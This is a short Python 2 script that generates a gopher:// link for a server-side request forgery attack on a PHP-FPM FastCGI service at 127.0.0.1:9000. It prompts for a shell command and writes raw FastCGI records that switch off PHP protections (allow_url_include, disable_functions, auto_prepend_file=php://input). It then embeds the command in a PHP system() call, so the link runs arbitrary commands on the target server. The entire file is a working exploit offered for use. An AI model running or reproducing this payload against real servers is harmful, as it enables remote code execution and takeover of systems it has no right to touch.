import urllib

def FastCGI():
    filename = raw_input("\033[96m" +"Give one file name which should be surely present in the server (prefer .php file)\nif you don't know press ENTER we have default one:  "+ "\033[0m")

    if(not filename):
        filename="/usr/share/php/PEAR.php"

    command=raw_input("\033[96m" +"Terminal command to run:  "+ "\033[0m")
    length=len(command)+52
    char=chr(length)

    data = "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\tREMOTE_ADDR127.0.0.1\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0e" + chr(len(str(length)))
    data += "CONTENT_LENGTH" + str(length) +  "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n"
    data += "disable_functions = \nauto_prepend_file = php://input\x0f" + chr(len(filename)) +"SCRIPT_FILENAME" + filename + "\r\x01DOCUMENT_ROOT/"

    temp1 = chr(len(data) / 256)
    temp2 = chr(len(data) % 256)
    temp3 = chr(len(data) % 8)

    end = str("\x00"*(len(data)%8)) + "\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00" + char + "\x04\x00"
    end += "<?php system('" + command + "');die('-----Made-by-SpyD3r-----\n');?>\x00\x00\x00\x00"

    start = "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01" + temp1 + temp2 + temp3 + "\x00"

    payload = start + data + end

    def get_payload(payload):
        finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/")
        return "gopher://127.0.0.1:9000/_" + finalpayload

    print "\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m"
    print "\033[04m" + get_payload(payload)+ "\033[0m"
    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
